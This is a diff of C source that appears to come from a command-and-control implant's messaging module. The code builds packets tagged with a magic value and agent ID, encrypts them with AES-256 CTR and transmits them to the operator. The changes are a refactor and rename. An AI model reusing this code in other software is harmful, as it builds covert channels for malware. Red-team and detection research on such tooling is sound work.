@@ -1,12 +1,13 @@
+/* Import Core Headers */
 #include <Core/Package.h>
 #include <Core/MiniStd.h>
 #include <Core/Command.h>
-
-#define CTR 1
-#define AES256 1
-
-#include <Crypt/AesCrypt.h>
 #include <Core/Transport.h>
+
+/* Import Crypto Header (enable CTR Mode) */
+#define CTR    1
+#define AES256 1
+#include <Crypt/AesCrypt.h>
 
 VOID Int64ToBuffer( PUCHAR Buffer, UINT64 Value )
 {
@@ -44,7 +45,7 @@ VOID Int32ToBuffer( PUCHAR Buffer, UINT32 Size )
 
 VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt )
 {
-    Package->Buffer = Instance->Win32.LocalReAlloc(
+    Package->Buffer = Instance.Win32.LocalReAlloc(
             Package->Buffer,
             Package->Length + sizeof( UINT32 ),
             LMEM_MOVEABLE
@@ -58,7 +59,7 @@ VOID PackageAddInt32( PPACKAGE Package, UINT32 dataInt )
 
 VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
 {
-    Package->Buffer = Instance->Win32.LocalReAlloc(
+    Package->Buffer = Instance.Win32.LocalReAlloc(
             Package->Buffer,
             Package->Length + sizeof( UINT64 ),
             LMEM_MOVEABLE
@@ -72,7 +73,7 @@ VOID PackageAddInt64( PPACKAGE Package, UINT64 dataInt )
 
 VOID PackageAddPad( PPACKAGE Package, PUCHAR Data, SIZE_T Size )
 {
-    Package->Buffer = Instance->Win32.LocalReAlloc(
+    Package->Buffer = Instance.Win32.LocalReAlloc(
             Package->Buffer,
             Package->Length + Size,
             LMEM_MOVEABLE | LMEM_ZEROINIT
@@ -89,7 +90,7 @@ VOID PackageAddBytes( PPACKAGE Package, PUCHAR Data, SIZE_T Size )
 {
     PackageAddInt32( Package, Size );
 
-    Package->Buffer = Instance->Win32.LocalReAlloc(
+    Package->Buffer = Instance.Win32.LocalReAlloc(
             Package->Buffer,
             Package->Length + Size,
             LMEM_MOVEABLE | LMEM_ZEROINIT
@@ -108,33 +109,30 @@ PPACKAGE PackageCreate( UINT32 CommandID )
 {
     PPACKAGE Package = NULL;
 
-    Package            = Instance->Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
-    Package->Buffer    = Instance->Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
+    Package            = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
+    Package->Buffer    = Instance.Win32.LocalAlloc( LPTR, sizeof( BYTE ) );
     Package->Length    = 0;
     Package->CommandID = CommandID;
     Package->Encrypt   = TRUE;
 
     PackageAddInt32( Package, 0 );
     PackageAddInt32( Package, DEMON_MAGIC_VALUE );
-    PackageAddInt32( Package, Instance->Session.DemonID );
+    PackageAddInt32( Package, Instance.Session.AgentID );
     PackageAddInt32( Package, CommandID );
 
     return Package;
 }
 
-// For serialize raw data
-PPACKAGE PackageNew(  )
+PPACKAGE PackageNew()
 {
     PPACKAGE Package = NULL;
 
-    Package          = Instance->Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
-    Package->Buffer  = Instance->Win32.LocalAlloc( LPTR, 0 );
+    Package          = Instance.Win32.LocalAlloc( LPTR, sizeof( PACKAGE ) );
+    Package->Buffer  = Instance.Win32.LocalAlloc( LPTR, 0 );
     Package->Length  = 0;
-    Package->Encrypt = TRUE;
+    Package->Encrypt = FALSE;
 
     PackageAddInt32( Package, 0 );
-    PackageAddInt32( Package, DEMON_MAGIC_VALUE );
-    PackageAddInt32( Package, Instance->Session.DemonID );
 
     return Package;
 }
@@ -151,11 +149,11 @@ VOID PackageDestroy( PPACKAGE Package )
     }
 
     MemSet( Package->Buffer, 0, Package->Length );
-    Instance->Win32.LocalFree( Package->Buffer );
+    Instance.Win32.LocalFree( Package->Buffer );
     Package->Buffer = NULL;
 
     MemSet( Package, 0, sizeof( PACKAGE ) );
-    Instance->Win32.LocalFree( Package );
+    Instance.Win32.LocalFree( Package );
     Package = NULL;
 }
 
@@ -176,7 +174,7 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
             if ( Package->CommandID == DEMON_INITIALIZE ) // only add these on init or key exchange
                 Padding += 32 + 16;
 
-            AesInit( &AesCtx, Instance->Config.AES.Key, Instance->Config.AES.IV );
+            AesInit( &AesCtx, Instance.Config.AES.Key, Instance.Config.AES.IV );
             AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );
         }
 
@@ -186,34 +184,21 @@ BOOL PackageTransmit( PPACKAGE Package, PVOID* Response, PSIZE_T Size )
         PackageDestroy( Package );
     }
     else
+    {
+        PUTS( "Package is empty" )
         Success = FALSE;
+    }
 
     return Success;
 }
 
-VOID PackageGen( PPACKAGE Package )
-{
-    Int32ToBuffer( Package->Buffer, Package->Length - sizeof( UINT32 ) );
-}
-
 VOID PackageTransmitError( UINT32 ID, UINT32 ErrorCode )
 {
-#ifdef DEBUG
-    printf("[%s] Transmit Error: %d\n", __FUNCTION__, ErrorCode);
-#endif
+    PRINTF( "Transmit Error: %d\n", ErrorCode );
     PPACKAGE Package = PackageCreate( DEMON_ERROR );
 
     PackageAddInt32( Package, ID );
     PackageAddInt32( Package, ErrorCode );
-    PackageTransmit( Package, NULL, NULL );
-}
-
-VOID PackageTransmitInfo( UINT32 ID, UINT32 InfoCode )
-{
-    PPACKAGE Package = PackageCreate( DEMON_INFO );
-    
-    PackageAddInt32( Package, ID );
-    PackageAddInt32( Package, InfoCode );
     PackageTransmit( Package, NULL, NULL );
 }
 
